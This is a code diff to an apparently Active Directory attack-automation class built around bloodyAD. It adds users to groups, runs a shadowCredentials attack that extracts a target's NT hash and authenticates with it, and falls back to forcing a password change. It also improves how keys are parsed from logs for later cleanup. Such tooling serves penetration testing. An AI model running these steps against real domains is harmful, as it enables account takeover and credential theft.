@@ -155,9 +155,8 @@ class Automation:
             group_dn = rel["end_node"]["distinguishedname"]
             try:
                 await add_operation(self.conn, group_dn, member_sid)
-                ldap_co = await self.conn.getLdap()
-                # Reconnect to apply changes
-                await ldap_co._con.connect()
+                # Close connection to apply changes
+                await self.conn.closeLdap()
                 self.dirty_laundry.append({"f": remove.groupMember, "args": [group_dn, member_sid]})
             except LDAPModifyException as e:
                 # Check if it's an entryAlreadyExists error
@@ -200,25 +199,27 @@ class Automation:
                 
             # Try shadowCredentials
             LOG.debug("Attempting shadowCredentials attack")
-            #"try:
-            key_matches, result = await extractFromLogs(r'key: (\S+)', shadow_operation, self.conn, target_dn)
-            key_groups = key_matches.groups() if key_matches else None
-            key = None
-            if key_groups:
-                key = key_groups[0]
-            else:
-                LOG.warning("Could not extract key from shadowCredentials logs, key won't be removed after exploit")
+            try:
+                key_matches, result = await extractFromLogs(r'key: (\S+)', shadow_operation, self.conn, target_dn)
+                # Retrieve all the groups of the first key match from logged output
+                key_groups = key_matches[0].groups() if key_matches else None
+                key = None
+                # If we have key groups, extract the key
+                if key_groups:
+                    key = key_groups[0]
+                else:
+                    LOG.warning("Could not extract key from shadowCredentials logs, key won't be removed after exploit")
 
-            pwd = ":" + result[1]    
-            print(f"Successfully obtained NT hash of {target} via shadowCredentials: {result[1]}")
-            # Pass NT hash in the format ":nt_hash" for NTLM authentication
-            LOG.info(f"Switching to user: {target}")
-            self.dirty_laundry.append({"f": remove.shadowCredentials, "args": [target_dn, key]})
-            await self._switchUser(target, pwd, dom=rel["end_node"]["domain"])
-            # except Exception as e:
-            #     # If shadowCredentials fails, fall back to forceChangePassword
-            #     LOG.warning(f"shadowCredentials failed: {e}, falling back to forceChangePassword")
-            #     await self._forceChangePassword(rel)
+                pwd = ":" + result[0]['NT']
+                print(f"Successfully obtained NT hash of {target} via shadowCredentials: {result[0]['NT']}")
+                # Pass NT hash in the format ":nt_hash" for NTLM authentication
+                LOG.info(f"Switching to user: {target}")
+                self.dirty_laundry.append({"f": remove.shadowCredentials, "args": [target_dn, key]})
+                await self._switchUser(target, pwd, dom=rel["end_node"]["domain"])
+            except Exception as e:
+                # If shadowCredentials fails, fall back to forceChangePassword
+                LOG.warning(f"shadowCredentials failed: {e}, falling back to forceChangePassword")
+                await self._forceChangePassword(rel)
 
     # ForceChangePassword edge directly changes the password
     async def _forceChangePassword(self, rel):
@@ -301,12 +302,14 @@ class Automation:
 class Grabber(logging.Handler):
         def __init__(self, pattern):
             super().__init__()
-            self.match = None
+            self.matches = []
             self.pattern = pattern
 
         def emit(self, record: logging.LogRecord):
             msg = record.getMessage()
-            self.match = re.search(self.pattern, msg)
+            m = re.search(self.pattern, msg)
+            if m:
+                self.matches.append(m)
 
 async def extractFromLogs(pattern, function, *args, **kwargs):
     logger = logging.getLogger('bloodyAD')
@@ -317,4 +320,4 @@ async def extractFromLogs(pattern, function, *args, **kwargs):
         results = await function(*args, **kwargs)
     finally:
         logger.removeHandler(grabber)
-    return (grabber.match, results)
+    return (grabber.matches, results)
